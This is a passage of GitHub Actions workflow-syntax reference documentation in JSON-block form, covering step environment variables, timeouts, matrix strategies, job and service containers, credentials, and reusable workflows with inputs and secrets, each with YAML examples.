        "text": "Example ofjobs.<job_id>.steps[*].with.entrypoint"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: Run a custom command\n    uses: octo-org/action-name@main\n    with:\n      entrypoint: /a/different/executable"
      },
      {
        "type": "paragraph",
        "text": "Theentrypointkeyword is meant to be used with Docker container actions, but you can also use it with JavaScript actions that don't define any inputs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].env"
      },
      {
        "type": "paragraph",
        "text": "Sets variables for steps to use in the runner environment. You can also set variables for the entire workflow or a job. For more information, seeenvandjobs.<job_id>.env."
      },
      {
        "type": "paragraph",
        "text": "When more than one environment variable is defined with the same name, GitHub uses the most specific variable. For example, an environment variable defined in a step will override job and workflow environment variables with the same name, while the step executes. An environment variable defined for a job will override a workflow variable with the same name, while the job executes."
      },
      {
        "type": "paragraph",
        "text": "Public actions may specify expected variables in the README file. If you are setting a secret or sensitive value, such as a password or token, you must set secrets using thesecretscontext. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.steps[*].env"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - name: My first action\n    env:\n      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      FIRST_NAME: Mona\n      LAST_NAME: Octocat"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].continue-on-error"
      },
      {
        "type": "paragraph",
        "text": "Prevents a job from failing when a step fails. Set totrueto allow a job to pass when this step fails."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.steps[*].timeout-minutes"
      },
      {
        "type": "paragraph",
        "text": "The maximum number of minutes to run the step before killing the process."
      },
      {
        "type": "paragraph",
        "text": "Fractional values are not supported.timeout-minutesmust be a positive integer."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.timeout-minutes"
      },
      {
        "type": "paragraph",
        "text": "The maximum number of minutes to let a job run before GitHub automatically cancels it. Default: 360"
      },
      {
        "type": "paragraph",
        "text": "If the timeout exceeds the job execution time limit for the runner, the job will be canceled when the execution time limit is met instead. For more information about job execution time limits, seeUsage limits, billing, and administrationfor GitHub-hosted runners andUsage limits for self-hosted runnersfor self-hosted runner usage limits."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "TheGITHUB_TOKENexpires when a job finishes or after a maximum of 24 hours. For self-hosted runners, the token may be the limiting factor if the job timeout is greater than 24 hours. For more information on theGITHUB_TOKEN, seeAutomatic token authentication."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.strategy"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.strategyto use a matrix strategy for your jobs. A matrix strategy lets you use variables in a single job definition to automatically create multiple job runs that are based on the combinations of the variables. For example, you can use a matrix strategy to test your code in multiple versions of a language or on multiple operating systems. For more information, seeRunning variations of jobs in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.strategy.matrix"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.strategy.matrixto define a matrix of different job configurations. Within your matrix, define one or more variables followed by an array of values. For example, the following matrix has a variable calledversionwith the value[10, 12, 14]and a variable calledoswith the value[ubuntu-latest, windows-latest]:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        version: [10, 12, 14]\n        os: [ubuntu-latest, windows-latest]"
      },
      {
        "type": "paragraph",
        "text": "A job will run for each possible combination of the variables. In this example, the workflow will run six jobs, one for each combination of theosandversionvariables."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub will maximize the number of jobs run in parallel depending on runner availability. The order of the variables in the matrix determines the order in which the jobs are created. The first variable you define will be the first job that is created in your workflow run. For example, the above matrix will create the jobs in the following order:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{version: 10, os: ubuntu-latest}",
          "{version: 10, os: windows-latest}",
          "{version: 12, os: ubuntu-latest}",
          "{version: 12, os: windows-latest}",
          "{version: 14, os: ubuntu-latest}",
          "{version: 14, os: windows-latest}"
        ]
      },
      {
        "type": "paragraph",
        "text": "A matrix will generate a maximum of 256 jobs per workflow run. This limit applies to both GitHub-hosted and self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "The variables that you define become properties in thematrixcontext, and you can reference the property in other areas of your workflow file. In this example, you can usematrix.versionandmatrix.osto access the current value ofversionandosthat the job is using. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a single-dimension matrix"
      },
      {
        "type": "paragraph",
        "text": "You can specify a single variable to create a single-dimension matrix."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow defines the variableversionwith the values[10, 12, 14]. The workflow will run three jobs, one for each value in the variable. Each job will access theversionvalue through thematrix.versioncontext and pass the value asnode-versionto theactions/setup-nodeaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        version: [10, 12, 14]\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.version }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a multi-dimension matrix"
      },
      {
        "type": "paragraph",
        "text": "You can specify multiple variables to create a multi-dimensional matrix. A job will run for each possible combination of the variables."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow specifies two variables:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Two operating systems specified in theosvariable",
          "Three Node.js versions specified in theversionvariable"
        ]
      },
      {
        "type": "paragraph",
        "text": "The workflow will run six jobs, one for each combination of theosandversionvariables. Each job will set theruns-onvalue to the currentosvalue and will pass the currentversionvalue to theactions/setup-nodeaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [ubuntu-22.04, ubuntu-20.04]\n        version: [10, 12, 14]\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.version }}"
      },
      {
        "type": "paragraph",
        "text": "A variable configuration in a matrix can be anarrayofobjects."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "matrix:\n  os:\n    - ubuntu-latest\n    - macos-latest\n  node:\n    - version: 14\n    - version: 20\n      env: NODE_OPTIONS=--openssl-legacy-provider"
      },
      {
        "type": "paragraph",
        "text": "This matrix produces 4 jobs with corresponding contexts."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- matrix.os: ubuntu-latest\n  matrix.node.version: 14\n- matrix.os: ubuntu-latest\n  matrix.node.version: 20\n  matrix.node.env: NODE_OPTIONS=--openssl-legacy-provider\n- matrix.os: macos-latest\n  matrix.node.version: 14\n- matrix.os: macos-latest\n  matrix.node.version: 20\n  matrix.node.env: NODE_OPTIONS=--openssl-legacy-provider"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using contexts to create matrices"
      },
      {
        "type": "paragraph",
        "text": "You can use contexts to create matrices. For more information about contexts, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow triggers on therepository_dispatchevent and uses information from the event payload to build the matrix. When a repository dispatch event is created with a payload like the one below, the matrixversionvariable will have a value of[12, 14, 16]. For more information about therepository_dispatchtrigger, seeEvents that trigger workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"event_type\": \"test\",\n  \"client_payload\": {\n    \"versions\": [12, 14, 16]\n  }\n}"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  repository_dispatch:\n    types:\n      - test\n \njobs:\n  example_matrix:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        version: ${{ github.event.client_payload.versions }}\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.version }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.strategy.matrix.include"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.strategy.matrix.includeto expand existing matrix configurations or to add new configurations. The value ofincludeis a list of objects."
      },
      {
        "type": "paragraph",
        "text": "For each object in theincludelist, the key:value pairs in the object will be added to each of the matrix combinations if none of the key:value pairs overwrite any of the original matrix values. If the object cannot be added to any of the matrix combinations, a new matrix combination will be created instead. Note that the original matrix values will not be overwritten, but added matrix values can be overwritten."
      },
      {
        "type": "paragraph",
        "text": "For example, this matrix:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "strategy:\n  matrix:\n    fruit: [apple, pear]\n    animal: [cat, dog]\n    include:\n      - color: green\n      - color: pink\n        animal: cat\n      - fruit: apple\n        shape: circle\n      - fruit: banana\n      - fruit: banana\n        animal: cat"
      },
      {
        "type": "paragraph",
        "text": "will result in six jobs with the following matrix combinations:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{fruit: apple, animal: cat, color: pink, shape: circle}",
          "{fruit: apple, animal: dog, color: green, shape: circle}",
          "{fruit: pear, animal: cat, color: pink}",
          "{fruit: pear, animal: dog, color: green}",
          "{fruit: banana}",
          "{fruit: banana, animal: cat}"
        ]
      },
      {
        "type": "paragraph",
        "text": "following this logic:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{color: green}is added to all of the original matrix combinations because it can be added without overwriting any part of the original combinations.",
          "{color: pink, animal: cat}addscolor:pinkonly to the original matrix combinations that includeanimal: cat. This overwrites thecolor: greenthat was added by the previousincludeentry.",
          "{fruit: apple, shape: circle}addsshape: circleonly to the original matrix combinations that includefruit: apple.",
          "{fruit: banana}cannot be added to any original matrix combination without overwriting a value, so it is added as an additional matrix combination.",
          "{fruit: banana, animal: cat}cannot be added to any original matrix combination without overwriting a value, so it is added as an additional matrix combination. It does not add to the{fruit: banana}matrix combination because that combination was not one of the original matrix combinations."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Expanding configurations"
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow will run four jobs, one for each combination ofosandnode. When the job for theosvalue ofwindows-latestandnodevalue of16runs, an additional variable callednpmwith the value of6will be included in the job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [windows-latest, ubuntu-latest]\n        node: [14, 16]\n        include:\n          - os: windows-latest\n            node: 16\n            npm: 6\n    runs-on: ${{ matrix.os }}\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}\n      - if: ${{ matrix.npm }}\n        run: npm install -g npm@${{ matrix.npm }}\n      - run: npm --version"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Adding configurations"
      },
      {
        "type": "paragraph",
        "text": "For example, this matrix will run 10 jobs, one for each combination ofosandversionin the matrix, plus a job for theosvalue ofwindows-latestandversionvalue of17."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [macos-latest, windows-latest, ubuntu-latest]\n        version: [12, 14, 16]\n        include:\n          - os: windows-latest\n            version: 17"
      },
      {
        "type": "paragraph",
        "text": "If you don't specify any matrix variables, all configurations underincludewill run. For example, the following workflow would run two jobs, one for eachincludeentry. This lets you take advantage of the matrix strategy without having a fully populated matrix."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  includes_only:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        include:\n          - site: \"production\"\n            datacenter: \"site-a\"\n          - site: \"staging\"\n            datacenter: \"site-b\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.strategy.matrix.exclude"
      },
      {
        "type": "paragraph",
        "text": "To remove specific configurations defined in the matrix, usejobs.<job_id>.strategy.matrix.exclude. An excluded configuration only has to be a partial match for it to be excluded. For example, the following workflow will run nine jobs: one job for each of the 12 configurations, minus the one excluded job that matches{os: macos-latest, version: 12, environment: production}, and the two excluded jobs that match{os: windows-latest, version: 16}."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "strategy:\n  matrix:\n    os: [macos-latest, windows-latest]\n    version: [12, 14, 16]\n    environment: [staging, production]\n    exclude:\n      - os: macos-latest\n        version: 12\n        environment: production\n      - os: windows-latest\n        version: 16\nruns-on: ${{ matrix.os }}"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Allincludecombinations are processed afterexclude. This allows you to useincludeto add back combinations that were previously excluded."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.strategy.fail-fast"
      },
      {
        "type": "paragraph",
        "text": "You can control how job failures are handled withjobs.<job_id>.strategy.fail-fastandjobs.<job_id>.continue-on-error."
      },
      {
        "type": "paragraph",
        "text": "jobs.<job_id>.strategy.fail-fastapplies to the entire matrix. Ifjobs.<job_id>.strategy.fail-fastis set totrueor its expression evaluates totrue, GitHub will cancel all in-progress and queued jobs in the matrix if any job in the matrix fails. This property defaults totrue."
      },
      {
        "type": "paragraph",
        "text": "jobs.<job_id>.continue-on-errorapplies to a single job. Ifjobs.<job_id>.continue-on-erroristrue, other jobs in the matrix will continue running even if the job withjobs.<job_id>.continue-on-error: truefails."
      },
      {
        "type": "paragraph",
        "text": "You can usejobs.<job_id>.strategy.fail-fastandjobs.<job_id>.continue-on-errortogether. For example, the following workflow will start four jobs. For each job,continue-on-erroris determined by the value ofmatrix.experimental. If any of the jobs withcontinue-on-error: falsefail, all jobs that are in progress or queued will be cancelled. If the job withcontinue-on-error: truefails, the other jobs will not be affected."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  test:\n    runs-on: ubuntu-latest\n    continue-on-error: ${{ matrix.experimental }}\n    strategy:\n      fail-fast: true\n      matrix:\n        version: [6, 7, 8]\n        experimental: [false]\n        include:\n          - version: 9\n            experimental: true"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.strategy.max-parallel"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub will maximize the number of jobs run in parallel depending on runner availability. To set the maximum number of jobs that can run simultaneously when using amatrixjob strategy, usejobs.<job_id>.strategy.max-parallel."
      },
      {
        "type": "paragraph",
        "text": "For example, the following workflow will run a maximum of two jobs at a time, even if there are runners available to run all six jobs at once."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  example_matrix:\n    strategy:\n      max-parallel: 2\n      matrix:\n        version: [10, 12, 14]\n        os: [ubuntu-latest, windows-latest]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.continue-on-error"
      },
      {
        "type": "paragraph",
        "text": "Prevents a workflow run from failing when a job fails. Set totrueto allow a workflow run to pass when this job fails."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Preventing a specific failing matrix job from failing a workflow run"
      },
      {
        "type": "paragraph",
        "text": "You can allow specific jobs in a job matrix to fail without failing the workflow run. For example, if you wanted to only allow an experimental job withnodeset to15to fail without failing the workflow run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: ${{ matrix.os }}\ncontinue-on-error: ${{ matrix.experimental }}\nstrategy:\n  fail-fast: false\n  matrix:\n    node: [13, 14]\n    os: [macos-latest, ubuntu-latest]\n    experimental: [false]\n    include:\n      - node: 15\n        os: ubuntu-latest\n        experimental: true"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.container"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your workflows use Docker container actions, job containers, or service containers, then you must use a Linux runner:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you are using GitHub-hosted runners, you must use an Ubuntu runner.",
          "If you are using self-hosted runners, you must use a Linux machine as your runner and Docker must be installed."
        ]
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.containerto create a container to run any steps in a job that don't already specify a container. If you have steps that use both script and container actions, the container actions will run as sibling containers on the same network with the same volume mounts."
      },
      {
        "type": "paragraph",
        "text": "If you do not set acontainer, all steps will run directly on the host specified byruns-onunless a step refers to an action configured to run in a container."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The default shell forrunsteps inside a container isshinstead ofbash. This can be overridden withjobs.<job_id>.defaults.runorjobs.<job_id>.steps[*].shell."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Running a job within a container"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: CI\non:\n  push:\n    branches: [ main ]\njobs:\n  container-test-job:\n    runs-on: ubuntu-latest\n    container:\n      image: node:18\n      env:\n        NODE_ENV: development\n      ports:\n        - 80\n      volumes:\n        - my_docker_volume:/volume_mount\n      options: --cpus 1\n    steps:\n      - name: Check for dockerenv file\n        run: (ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)"
      },
      {
        "type": "paragraph",
        "text": "When you only specify a container image, you can omit theimagekeyword."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  container-test-job:\n    runs-on: ubuntu-latest\n    container: node:18"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.container.image"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.imageto define the Docker image to use as the container to run the action. The value can be the Docker Hub image name or a registry name."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Docker Hub normally imposes rate limits on both push and pull operations which will affect jobs on self-hosted runners. However, GitHub-hosted runners are not subject to these limits based on an agreement between GitHub and Docker."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.container.credentials"
      },
      {
        "type": "paragraph",
        "text": "If the image's container registry requires authentication to pull the image, you can usejobs.<job_id>.container.credentialsto set amapof theusernameandpassword. The credentials are the same values that you would provide to thedocker logincommand."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Defining credentials for a container registry"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "container:\n  image: ghcr.io/owner/image\n  credentials:\n     username: ${{ github.actor }}\n     password: ${{ secrets.github_token }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.container.env"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.envto set amapof environment variables in the container."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.container.ports"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.portsto set anarrayof ports to expose on the container."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.container.volumes"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.volumesto set anarrayof volumes for the container to use. You can use volumes to share data between services or other steps in a job. You can specify named Docker volumes, anonymous Docker volumes, or bind mounts on the host."
      },
      {
        "type": "paragraph",
        "text": "To specify a volume, you specify the source and destination path:"
      },
      {
        "type": "paragraph",
        "text": "<source>:<destinationPath>."
      },
      {
        "type": "paragraph",
        "text": "The<source>is a volume name or an absolute path on the host machine, and<destinationPath>is an absolute path in the container."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Mounting volumes in a container"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "volumes:\n  - my_docker_volume:/volume_mount\n  - /data/my_data\n  - /source/directory:/destination/directory"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.container.options"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.container.optionsto configure additional Docker container resource options. For a list of options, seedocker createoptions."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "The--networkand--entrypointoptions are not supported."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.services"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If your workflows use Docker container actions, job containers, or service containers, then you must use a Linux runner:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you are using GitHub-hosted runners, you must use an Ubuntu runner.",
          "If you are using self-hosted runners, you must use a Linux machine as your runner and Docker must be installed."
        ]
      },
      {
        "type": "paragraph",
        "text": "Used to host service containers for a job in a workflow. Service containers are useful for creating databases or cache services like Redis. The runner automatically creates a Docker network and manages the life cycle of the service containers."
      },
      {
        "type": "paragraph",
        "text": "If you configure your job to run in a container, or your step uses container actions, you don't need to map ports to access the service or action. Docker automatically exposes all ports between containers on the same Docker user-defined bridge network. You can directly reference the service container by its hostname. The hostname is automatically mapped to the label name you configure for the service in the workflow."
      },
      {
        "type": "paragraph",
        "text": "If you configure the job to run directly on the runner machine and your step doesn't use a container action, you must map any required Docker service container ports to the Docker host (the runner machine). You can access the service container using localhost and the mapped port."
      },
      {
        "type": "paragraph",
        "text": "For more information about the differences between networking service containers, seeAbout service containers."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using localhost"
      },
      {
        "type": "paragraph",
        "text": "This example creates two services: nginx and redis. When you specify the container port but not the host port, the container port is randomly assigned to a free port on the host. GitHub sets the assigned host port in the${{job.services.<service_name>.ports}}context. In this example, you can access the service host ports using the${{ job.services.nginx.ports['80'] }}and${{ job.services.redis.ports['6379'] }}contexts."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "services:\n  nginx:\n    image: nginx\n    # Map port 8080 on the Docker host to port 80 on the nginx container\n    ports:\n      - 8080:80\n  redis:\n    image: redis\n    # Map random free TCP port on Docker host to port 6379 on redis container\n    ports:\n      - 6379/tcp\nsteps:\n  - run: |\n      echo \"Redis available on 127.0.0.1:${{ job.services.redis.ports['6379'] }}\"\n      echo \"Nginx available on 127.0.0.1:${{ job.services.nginx.ports['80'] }}\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.services.<service_id>.image"
      },
      {
        "type": "paragraph",
        "text": "The Docker image to use as the service container to run the action. The value can be the Docker Hub image name or a registry name."
      },
      {
        "type": "paragraph",
        "text": "Ifjobs.<job_id>.services.<service_id>.imageis assigned an empty string, the service will not start. You can use this to set up conditional services, similar to the following example."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "services:\n  nginx:\n    image: ${{ options.nginx == true && 'nginx' || '' }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.services.<service_id>.credentials"
      },
      {
        "type": "paragraph",
        "text": "If the image's container registry requires authentication to pull the image, you can usejobs.<job_id>.container.credentialsto set amapof theusernameandpassword. The credentials are the same values that you would provide to thedocker logincommand."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.services.<service_id>.credentials"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "services:\n  myservice1:\n    image: ghcr.io/owner/myservice1\n    credentials:\n      username: ${{ github.actor }}\n      password: ${{ secrets.github_token }}\n  myservice2:\n    image: dockerhub_org/myservice2\n    credentials:\n      username: ${{ secrets.DOCKER_USER }}\n      password: ${{ secrets.DOCKER_PASSWORD }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.services.<service_id>.env"
      },
      {
        "type": "paragraph",
        "text": "Sets amapof environment variables in the service container."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.services.<service_id>.ports"
      },
      {
        "type": "paragraph",
        "text": "Sets anarrayof ports to expose on the service container."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.services.<service_id>.volumes"
      },
      {
        "type": "paragraph",
        "text": "Sets anarrayof volumes for the service container to use. You can use volumes to share data between services or other steps in a job. You can specify named Docker volumes, anonymous Docker volumes, or bind mounts on the host."
      },
      {
        "type": "paragraph",
        "text": "To specify a volume, you specify the source and destination path:"
      },
      {
        "type": "paragraph",
        "text": "<source>:<destinationPath>."
      },
      {
        "type": "paragraph",
        "text": "The<source>is a volume name or an absolute path on the host machine, and<destinationPath>is an absolute path in the container."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.services.<service_id>.volumes"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "volumes:\n  - my_docker_volume:/volume_mount\n  - /data/my_data\n  - /source/directory:/destination/directory"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.services.<service_id>.options"
      },
      {
        "type": "paragraph",
        "text": "Additional Docker container resource options. For a list of options, seedocker createoptions."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "The--networkoption is not supported."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.uses"
      },
      {
        "type": "paragraph",
        "text": "The location and version of a reusable workflow file to run as a job. Use one of the following syntaxes:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{owner}/{repo}/.github/workflows/{filename}@{ref}for reusable workflows in public and private repositories.",
          "./.github/workflows/{filename}for reusable workflows in the same repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "In the first option,{ref}can be a SHA, a release tag, or a branch name. If a release tag and a branch have the same name, the release tag takes precedence over the branch name. Using the commit SHA is the safest option for stability and security. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "If you use the second syntax option (without{owner}/{repo}and@{ref}) the called workflow is from the same commit as the caller workflow. Ref prefixes such asrefs/headsandrefs/tagsare not allowed. You cannot use contexts or expressions in this keyword."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.uses"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  call-workflow-1-in-local-repo:\n    uses: octo-org/this-repo/.github/workflows/workflow-1.yml@172239021f7ba04fe7327647b213799853a9eb89\n  call-workflow-2-in-local-repo:\n    uses: ./.github/workflows/workflow-2.yml\n  call-workflow-in-another-repo:\n    uses: octo-org/another-repo/.github/workflows/workflow.yml@v1"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.with"
      },
      {
        "type": "paragraph",
        "text": "When a job is used to call a reusable workflow, you can usewithto provide a map of inputs that are passed to the called workflow."
      },
      {
        "type": "paragraph",
        "text": "Any inputs that you pass must match the input specifications defined in the called workflow."
      },
      {
        "type": "paragraph",
        "text": "Unlikejobs.<job_id>.steps[*].with, the inputs you pass withjobs.<job_id>.withare not available as environment variables in the called workflow. Instead, you can reference the inputs by using theinputscontext."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.with"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  call-workflow:\n    uses: octo-org/example-repo/.github/workflows/called-workflow.yml@main\n    with:\n      username: mona"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.with.<input_id>"
      },
      {
        "type": "paragraph",
        "text": "A pair consisting of a string identifier for the input and the value of the input. The identifier must match the name of an input defined byon.workflow_call.inputs.<inputs_id>in the called workflow. The data type of the value must match the type defined byon.workflow_call.inputs.<input_id>.typein the called workflow."
      },
      {
        "type": "paragraph",
        "text": "Allowed expression contexts:github, andneeds."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.secrets"
      },
      {
        "type": "paragraph",
        "text": "When a job is used to call a reusable workflow, you can usesecretsto provide a map of secrets that are passed to the called workflow."
      },
      {
        "type": "paragraph",
        "text": "Any secrets that you pass must match the names defined in the called workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.secrets"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  call-workflow:\n    uses: octo-org/example-repo/.github/workflows/called-workflow.yml@main\n    secrets:\n      access-token: ${{ secrets.PERSONAL_ACCESS_TOKEN }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.secrets.inherit"
      },
      {
        "type": "paragraph",
        "text": "Use theinheritkeyword to pass all the calling workflow's secrets to the called workflow. This includes all secrets the calling workflow has access to, namely organization, repository, and environment secrets. Theinheritkeyword can be used to pass secrets across repositories within the same organization, or across organizations within the same enterprise."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example ofjobs.<job_id>.secrets.inherit"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_dispatch:\n\njobs:\n  pass-secrets-to-workflow:\n    uses: ./.github/workflows/called-workflow.yml\n    secrets: inherit"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_call:\n\njobs:\n  pass-secret-to-action:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Use a repo or org secret from the calling workflow.\n        run: echo ${{ secrets.CALLING_WORKFLOW_SECRET }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "jobs.<job_id>.secrets.<secret_id>"
      },
      {
        "type": "paragraph",
        "text": "A pair consisting of a string identifier for the secret and the value of the secret. The identifier must match the name of a secret defined byon.workflow_call.secrets.<secret_id>in the called workflow."
      },
      {
        "type": "paragraph",
        "text": "Allowed expression contexts:github,needs, andsecrets."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Filter pattern cheat sheet"
      },
      {
        "type": "paragraph",
        "text": "You can use special characters in path, branch, and tag filters."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "*: Matches zero or more characters, but does not match the/character. For example,Octo*matchesOctocat.",
          "**: Matches zero or more of any character.",
          "?: Matches zero or one of the preceding character.",
          "+: Matches one or more of the preceding character.",
          "[]Matches one alphanumeric character listed in the brackets or included in ranges. Ranges can only includea-z,A-Z, and0-9. For example, the range[0-9a-z]matches any digit or lowercase letter. For example,[CB]atmatchesCatorBatand[1-2]00matches100and200.",
          "!: At the start of a pattern makes it negate previous positive patterns. It has no special meaning if not the first character."
        ]
      },
